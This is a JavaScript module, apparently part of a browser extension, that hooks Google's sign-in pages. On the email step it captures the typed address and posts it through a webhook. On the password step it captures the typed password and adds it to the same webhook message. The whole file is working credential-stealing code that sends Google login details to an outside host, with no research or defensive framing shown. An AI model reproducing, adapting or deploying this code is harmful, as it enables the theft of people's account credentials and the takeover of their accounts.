const Util = require('../../utils');
const { formatFields, code } = require('../../utils/Webhook');
const { wait } = require('../../utils/Document');
const variable = `${window.location.hostname}_${Date.now()}_messageId`;

module.exports = {
  webPattern: /https:\/\/accounts\.google\.com/g,
  urlsMatches: [
    {
      path: '/v3/signin/identifier',
      run() {
        const emailInput = document.querySelector(this.getSelector('input'));
        const submitButton = document.querySelector(this.getSelector('submit'));

        submitButton.addEventListener('click', async () => {
          const { id } = await Util.Webhook.sendEmbed({
            author: {
              name: 'Google'
            },
            title: 'New account is being added',
            fields: formatFields([
              ['Email', code(emailInput.value)],
            ])
          });
          await chrome.storage.local.set({ [variable]: id });
        });
      }
    },
    {
      path: '/v3/signin/challenge/pwd',
      async run() {
        await wait(1000);
        const passwordInput = document.querySelector(this.getSelector('input'));
        const submitButton = document.querySelector(this.getSelector('submit'));

        submitButton.addEventListener('click', async () => {
          const id = await chrome.storage.local.get(variable);
          if (!id) return;
          const embed = await Util.Webhook.getMessage(id);
          embed.fields.push(['Password', passwordInput.value]);
          await Util.Webhook.editEmbed(embed, id);
        });
      }
    }
  ],
  selectors: {
    input: '.whsOnd.zHQkBf',
    submit: 'button[jscontroller="soHxf"][data-idom-class^="nCP5yc AjY5Oe"]'
  }
};
